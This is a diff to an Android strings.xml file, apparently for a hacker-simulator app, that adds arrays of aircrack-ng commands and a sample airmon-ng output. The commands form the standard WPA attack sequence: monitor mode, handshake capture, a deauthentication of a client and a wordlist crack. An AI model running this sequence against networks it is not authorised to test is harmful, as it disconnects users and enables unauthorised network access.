@@ -5,4 +5,33 @@
     <string name="dummy_content">DUMMY\nCONTENT</string>
 
     <string name="dummy_hack">Loading hack...</string>
+
+    <!-- commands -->
+
+    <!-- wifi -->
+    <string-array name="c_aircrack_ng">
+        <item>airmon-ng</item>
+        <item>airmon-ng stop ath0</item>
+        <item>airmon-ng start wifi0 9</item>
+        <item>airmon-ng start rausb0 9</item>
+        <item>airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0</item>
+        <item>aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0</item>
+        <item>aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap</item>
+    </string-array>
+
+
+    <!-- answers -->
+
+    <!-- wifi -->
+    <string-array name="a_aircrack_ng">
+        <item>Interface       Chipset         Driver\nrausb0          Ralink RT73     rt73\nwlan0           Broadcom        b43 - [phy0]\nwifi0           Atheros         madwifi-ng\nath0            Atheros         madwifi-ng VAP (parent: wifi0)</item>
+        <item>airmon-ng stop ath0</item>
+        <item>airmon-ng start wifi0 9</item>
+        <item>airmon-ng start rausb0 9</item>
+        <item>airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0</item>
+        <item>aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0</item>
+        <item>aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap</item>
+    </string-array>
+
+
 </resources>
